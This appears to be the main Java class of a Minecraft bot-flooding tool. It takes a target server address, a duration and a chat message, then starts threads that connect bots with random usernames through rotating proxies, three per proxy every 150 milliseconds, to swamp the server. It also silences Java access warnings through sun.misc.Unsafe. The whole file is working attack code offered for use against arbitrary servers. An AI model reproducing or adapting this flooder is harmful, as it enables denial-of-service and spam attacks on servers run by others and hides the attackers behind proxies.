package neko.itskekoffcode.bjar;

import com.github.steveice10.mc.protocol.MinecraftProtocol;
import java.awt.Color;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.Proxy;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Objects;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import neko.itskekoffcode.bjar.bot.Bot;
import neko.itskekoffcode.bjar.parser.ProxyParser;
import neko.itskekoffcode.bjar.parser.ServerParser;
import neko.itskekoffcode.bjar.utils.ThreadUtils;
import org.apache.commons.lang3.RandomStringUtils;
import sun.misc.Unsafe;
public class Main {
    public static int duration;

    private static Main instance;
    public static final ServerParser serverParser = new ServerParser();
    private static Random random = new Random();
    public static ProxyParser proxyParser = new ProxyParser();
    public Date date = Calendar.getInstance().getTime();
    private String messages;
    public static String message;
    public DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");

    public String strDate;
    public static void main(String[] args) throws IOException, InterruptedException {
        (new Main()).Launch(args);
    }

    public Main() {
        this.strDate = this.dateFormat.format(this.date);
        instance = this;
        System.setProperty("socksProxyVersion", "4");
        proxyParser = new ProxyParser();
        random = new Random(System.currentTimeMillis());
        instance = this;
    }
    public static void disableWarning() {
        try {
            Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafe.setAccessible(true);
            Unsafe u = (Unsafe)theUnsafe.get((Object)null);
            Class cls = Class.forName("jdk.internal.module.IllegalAccessLogger");
            Field logger = cls.getDeclaredField("logger");
            u.putObjectVolatile(cls, u.staticFieldOffset(logger), (Object)null);
        } catch (Exception var4) {
        }

    }
    public static Main getInstance() {
        return instance;
    }

    private void Launch(String[] args) throws IOException, InterruptedException {
        try {
            if (args.length != 3) {
                System.err.println("[Error] Correct usage: java -jar " + (new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI())).getName() + " <IP:PORT> <DURATION> <MESSAGE>");
                System.exit(0);
            }
            System.out.printf("IP: %s\nTIME: %s\nMESSAGE: %s%n", args[0], args[1], args[2]);
            duration = Integer.parseInt(args[1]);
            message = args[2];
            File proxyFilee = new File("./proxys.txt");
            proxyFilee.delete();
            TimeUnit.SECONDS.sleep(Long.parseLong("1"));
            proxyParser.init();
            (new Thread(() -> {
                for (int k = 0; k < duration; ++k) {
                    Proxy proxy = proxyParser.nextProxy();

                    for(int i = 0; i < 3; ++i) {
                        try {
                            (new Thread(() -> {
                                try {
                                    (new Bot(new MinecraftProtocol(RandomStringUtils.random(14, true, true)), proxy)).connect(args[0].split(":")[0], Integer.parseInt(args[0].split(":")[1]));
                                    ThreadUtils.sleep(60000L);
                                } catch (IOException var2) {
                                    var2.printStackTrace();
                                }

                            })).start();
                        } catch (Exception var3) {
                        }
                    }

                    ThreadUtils.sleep(150L);
                }
                System.exit(0);
            })).start();
        } catch (Exception var2) {
            var2.printStackTrace();
        }

    }
    private String readFromInputStream(InputStream inputStream) {
        return null;
    }

    public Random getRandom() {
        return random;
    }

    public int getMessageDelay() {
        Objects.requireNonNull(this);
        return 3500;
    }

    public ServerParser getServerParser() {
        return serverParser;
    }

    public String getMessages() {
        return this.messages;
    }

}